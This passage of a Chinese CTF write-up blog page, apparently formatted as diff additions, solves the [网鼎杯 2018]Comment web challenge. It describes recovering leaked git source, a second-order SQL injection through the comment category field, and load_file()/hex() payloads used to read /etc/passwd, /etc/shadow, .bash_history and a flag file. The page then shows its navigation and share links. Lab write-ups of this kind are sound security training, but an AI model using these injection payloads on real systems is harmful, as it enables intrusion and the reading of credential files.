+<p>这题是事先就被透露了是 git 源码泄露的，其实还有个要点，Console 里说没有 commit，这点很重要。调整 git 的 HEAD 才能拿到完整的源码，使用到的工具是 <a target="_blank" rel="noopener" href="https://github.com/wangyihang/githacker">githacker</a>。恢复源码之后可以拿到 write_do.php。仔细读一读，不难发现，修改的时候 <code> $category = mysql_fetch_array($result)[&#39;category&#39;];</code>，这里的变量 <code>$category</code> 会被直接传入 SQL 语句中。所以只要想办法使 <code>content</code> 变成我们想要的数据就行了。所以，可以使 <code>category</code> 为 <code>&#39;,content=payload/*</code> 然后提交之后再修改 <code>content</code> 使其为 <code>*/#</code> 闭合一个注释然后把后面的语句都注释掉，这个时候，语句变化了，这样就能使 <code>content</code> 输出我们需要的内容。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">            set category = &#x27;&#x27;,content=payload/*&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;*/#&#x27;,</span></span><br><span class="line"><span class="string">                bo_id = &#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="string">&quot;insert into comment set category = &#x27;&#x27;,content=payload/**/#&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>一开始我是想直接找到用户密码的，尝试读取 <code>/etc/passwd</code> 和 <code>/etc/shadow</code> 未果之后，我又长了新知识。根据 <code>/etc/passwd</code> 下的提示 ，www 用户可以使用 bash，于是查询该用户的 <code>.bash_history</code> 找到了线索，读取 <code>/tmp/html/.DS_Store</code>。这里还有个要点，因为文件太长了，使用 <code>load_file()</code> 读取的时候可能显示不完整，所以就用 <code>hex()</code> 转换一下，构造 <code>&#39;,content=(select hex(load_file(&#39;/tmp/html/.DS_Store&#39;))),/*</code>，解码之后找到了线索 <code>flag_ 8946e1ff1ee3e40f.php</code>。按照一样的套路读取这个文件可以读取到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;bcd19c68-e4eb-43d7-845a-7a51bce22828&#125;</span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-tornado"><span class="toc-number">1.</span> <span class="toc-text">[护网杯 2018]easy_tornado</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HCTF-2018-WarmUp"><span class="toc-number">2.</span> <span class="toc-text">[HCTF 2018]WarmUp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="toc-number">3.</span> <span class="toc-text">[强网杯 2019]随便注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SUCTF-2019-EasySQL"><span class="toc-number">4.</span> <span class="toc-text">[SUCTF 2019]EasySQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HCTF-2018-admin"><span class="toc-number">5.</span> <span class="toc-text">[HCTF 2018]admin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RoarCTF-2019-Easy-Calc"><span class="toc-number">6.</span> <span class="toc-text">[RoarCTF 2019]Easy Calc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SUCTF-2019-CheckIn"><span class="toc-number">7.</span> <span class="toc-text">[SUCTF 2019]CheckIn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World"><span class="toc-number">8.</span> <span class="toc-text">[CISCN2019 华北赛区 Day2 Web1]Hack World</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook"><span class="toc-number">9.</span> <span class="toc-text">[网鼎杯 2018]Fakebook</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#De1CTF-2019-SSRF-Me"><span class="toc-number">10.</span> <span class="toc-text">[De1CTF 2019]SSRF Me</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GXYCTF2019-Ping-Ping-Ping"><span class="toc-number">11.</span> <span class="toc-text">[GXYCTF2019]Ping Ping Ping</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ZJCTF-2019-NiZhuanSiWei"><span class="toc-number">12.</span> <span class="toc-text">[ZJCTF 2019]NiZhuanSiWei</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include"><span class="toc-number">13.</span> <span class="toc-text">[ACTF2020 新生赛]Include</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec"><span class="toc-number">14.</span> <span class="toc-text">[ACTF2020 新生赛]Exec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RoarCTF-2019-Easy-Java"><span class="toc-number">15.</span> <span class="toc-text">[RoarCTF 2019]Easy Java</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BUUCTF-2018-Online-Tool"><span class="toc-number">16.</span> <span class="toc-text">[BUUCTF 2018]Online Tool</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-BackupFile"><span class="toc-number">17.</span> <span class="toc-text">[ACTF2020 新生赛]BackupFile</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WUSTCTF2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E"><span class="toc-number">18.</span> <span class="toc-text">[WUSTCTF2020]朴实无华</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WUSTCTF2020-%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2"><span class="toc-number">19.</span> <span class="toc-text">[WUSTCTF2020]颜值成绩查询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web11"><span class="toc-number">20.</span> <span class="toc-text">[CISCN2019 华东南赛区]Web11</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web"><span class="toc-number">21.</span> <span class="toc-text">[安洵杯 2019]easy_web</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83"><span class="toc-number">22.</span> <span class="toc-text">[GXYCTF2019]禁止套娃</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment"><span class="toc-number">23.</span> <span class="toc-text">[网鼎杯 2018]Comment</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lemonprefect.cn/zh-CN/posts/d24ddcdc.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lemonprefect.cn/zh-CN/posts/d24ddcdc.html&text=BUUOJ Web 一分题 WriteUp 合集"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lemonprefect.cn/zh-CN/posts/d24ddcdc.html&title=BUUOJ Web 一分题 WriteUp 合集"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lemonprefect.cn/zh-CN/posts/d24ddcdc.html&is_video=false&description=BUUOJ Web 一分题 WriteUp 合集"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BUUOJ Web 一分题 WriteUp 合集&body=Check out this article: https://lemonprefect.cn/zh-CN/posts/d24ddcdc.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lemonprefect.cn/zh-CN/posts/d24ddcdc.html&title=BUUOJ Web 一分题 WriteUp 合集"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lemonprefect.cn/zh-CN/posts/d24ddcdc.html&title=BUUOJ Web 一分题 WriteUp 合集"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lemonprefect.cn/zh-CN/posts/d24ddcdc.html&title=BUUOJ Web 一分题 WriteUp 合集"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lemonprefect.cn/zh-CN/posts/d24ddcdc.html&title=BUUOJ Web 一分题 WriteUp 合集"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lemonprefect.cn/zh-CN/posts/d24ddcdc.html&name=BUUOJ Web 一分题 WriteUp 合集&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lemonprefect.cn/zh-CN/posts/d24ddcdc.html&t=BUUOJ Web 一分题 WriteUp 合集"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+        
+        
+        <li>
+        
+          <a href="#">简</a>
+        
+          <a href="/en">En</a>
+        
+          <a href="/zh-TW">正</a>
+        
+        </li>
+      </ul>
+    </nav>
+  </div>
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2018-2021
+    LemonPrefect
+    湘ICP备20002800号
+    
+      <img src="/images/beian.png"/>
+      湘公网安备43021102000188号
+    
+    
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
